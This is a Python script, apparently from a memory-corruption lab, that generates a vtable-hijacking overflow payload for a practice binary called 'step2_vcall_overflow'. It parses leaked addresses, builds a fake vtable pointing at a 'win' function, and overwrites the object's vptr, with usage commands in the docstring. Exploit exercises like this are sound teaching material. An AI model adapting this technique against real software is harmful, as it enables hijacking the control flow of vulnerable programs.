#!/usr/bin/env python3
"""
Generate exploit payload for step2_vcall_overflow.

Reads addresses from stdin (binary's stdout) and outputs payload to stdout.

Usage examples:

1. With process substitution (bash/zsh):
   ./step2_vcall_overflow <(./step2_vcall_overflow 2>&1 | python3 step2_vcall_gen.py)

2. Manual two-step:
   # Step 1: Get addresses
   ./step2_vcall_overflow 2>&1 | head -2 > addresses.txt
   # Step 2: Generate payload and pipe to binary
   cat addresses.txt | python3 step2_vcall_gen.py | ./step2_vcall_overflow

3. With named pipe:
   mkfifo /tmp/exploit_pipe
   ./step2_vcall_overflow 2>&1 | python3 step2_vcall_gen.py > /tmp/exploit_pipe &
   ./step2_vcall_overflow < /tmp/exploit_pipe
"""

import re
import struct
import sys


def main() -> None:
    # Read addresses from stdin (binary's stdout)
    win_line = sys.stdin.buffer.readline()
    buf_line = sys.stdin.buffer.readline()

    win_match = re.search(rb"0x([0-9a-fA-F]+)", win_line)
    buf_match = re.search(rb"0x([0-9a-fA-F]+)", buf_line)
    if not win_match or not buf_match:
        print("Error: failed to parse addresses", file=sys.stderr)
        print(f"win_line: {win_line}", file=sys.stderr)
        print(f"buf_line: {buf_line}", file=sys.stderr)
        sys.exit(1)

    win_addr = int(win_match.group(1), 16)
    buf_addr = int(buf_match.group(1), 16)

    # Generate payload: fake vtable at start of buf, then padding, then vptr
    fake_vtable = struct.pack("<Q", win_addr)
    payload = fake_vtable + (b"A" * (64 - 8)) + struct.pack("<Q", buf_addr)

    # Output payload to stdout (will be piped to binary's stdin)
    try:
        sys.stdout.buffer.write(payload)
        sys.stdout.buffer.flush()
    except BrokenPipeError:
        # Process reading from us closed the pipe - this is fine
        pass


if __name__ == "__main__":
    main()
